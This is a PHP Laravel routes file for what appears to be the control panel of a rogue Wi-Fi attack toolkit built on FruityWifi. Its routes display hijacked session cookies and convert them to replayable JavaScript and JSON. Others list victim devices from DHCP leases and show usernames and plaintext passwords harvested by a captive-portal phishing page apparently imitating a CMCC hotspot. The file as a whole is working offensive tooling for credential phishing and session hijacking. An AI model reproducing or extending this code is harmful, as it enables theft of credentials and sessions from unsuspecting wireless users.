<?php

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It's a breeze. Simply tell Laravel the URIs it should respond to
| and give it the Closure to execute when that URI is requested.
|
*/

Route::get('/', function()
{
	$oui=json_decode(file_get_contents(storage_path().'/oui.json'),true);
	$cookies=Cookies::orderBy('updated_at','desc')->get();
	foreach($cookies as &$cookie)
		if(isset($oui[strtoupper(substr($cookie['clientMAC'],0,8))]))
			$cookie['manufacturer']=$oui[strtoupper(substr($cookie['clientMAC'],0,8))];
		else
			$cookie['manufacturer']='unknown';
	return View::make('session-hijacking')->with(array('cookies' => $cookies));
});
Route::get('api/session-hijacking', function()
{
	$resp=Cookies::orderBy('updated_at','desc')->get();
	foreach($resp as &$cookie){
		$cookie['cookiejs']=Tools::jsCookie($cookie['cookie']);
		$cookie['cookiejson']=Tools::jsonCookie($cookie['cookie'],$cookie['domain']);
	}
	return json_encode($resp);
});
Route::get('wifiphish', function()
{
	include '/usr/share/FruityWifi/www/config/config.php';
	exec("/sbin/iw dev $io_in_iface station dump |grep Stat", $stations);
	$onlineMac=[];
	foreach($stations as $station)
		$onlineMac[]=explode(' ',$station)[1];
	$lease_file='/usr/share/FruityWifi/logs/dhcp.leases';
	$lease=file_get_contents($lease_file);
	$lease=explode("\n",$lease);
	while(count($lease)>0 && $lease[count($lease)-1]=='')
		unset($lease[count($lease)-1]);
	$lease_dict=[];
	$oui=json_decode(file_get_contents(storage_path().'/oui.json'),true);
	foreach($lease as $l){
		$tmp=explode(' ',$l);
		$lease_dict[$tmp[1]]['time']=date("Y-m-d H:i:s",$tmp[0]);
		$lease_dict[$tmp[1]]['mac']=$tmp[1];
		$lease_dict[$tmp[1]]['ip']=$tmp[2];
		$lease_dict[$tmp[1]]['hostname']=$tmp[3];
		if(isset($oui[strtoupper(substr($tmp[1],0,8))]))
			$lease_dict[$tmp[1]]['manufacturer']=$oui[strtoupper(substr($tmp[1],0,8))];
		else
			$lease_dict[$tmp[1]]['manufacturer']='unknown';
#		$lease_dict[$tmp[1]]['manufacturer']=Tools::findOUI($tmp[1]);
		if(in_array($tmp[1],$onlineMac))
			$lease_dict[$tmp[1]]['online']=true;
		else
			$lease_dict[$tmp[1]]['online']=false;
	}
	#print_r($lease_dict);
	return View::make('wifiphish')->with(array('lease'=>$lease_dict));
});
Route::get('cmccphish', function()
{
	$lease_file='/usr/share/FruityWifi/logs/dhcp.leases';
	$lease=file_get_contents($lease_file);
	$lease=explode("\n",$lease);
	while(count($lease)>0 && $lease[count($lease)-1]=='')
		unset($lease[count($lease)-1]);
	$lease_dict=[];
	foreach($lease as $l){
		$tmp=explode(' ',$l);
		$lease_dict[$tmp[1]]['mac']=$tmp[1];
		$lease_dict[$tmp[1]]['ip']=$tmp[2];
		$lease_dict[$tmp[1]]['hostname']=$tmp[3];
	}

	$file='/var/www/site/captive/admin/users';
	$data=file_get_contents($file);
	$users=[];
	$oui=json_decode(file_get_contents(storage_path().'/oui.json'),true);
	foreach(explode("\n",$data) as $d){
		$tmp=explode('|',$d);
		if(count($tmp)!=5)
			continue;
		$tmp[3]=strtolower($tmp[3]);
		$hostname='unknown';
		if(isset($lease_dict[$tmp[3]]))
			$hostname=$lease_dict[$tmp[3]]['hostname'];
		#$manufacturer=Tools::findOUI($tmp[3]);
		if(isset($oui[strtoupper(substr($tmp[3],0,8))]))
			$manufacturer=$oui[strtoupper(substr($tmp[3],0,8))];
		else
			$manufacturer='unknown';
		$users[]=array('name'=>$tmp[0],'password'=>$tmp[1],'ip'=>$tmp[2],'mac'=>$tmp[3],'time'=>$tmp[4],'hostname'=>$hostname,'manufacturer'=>$manufacturer);
	}
	return View::make('cmccphish')->with(array('users'=>$users));
});
Route::get('test', function()
{
	return View::make('test');
});
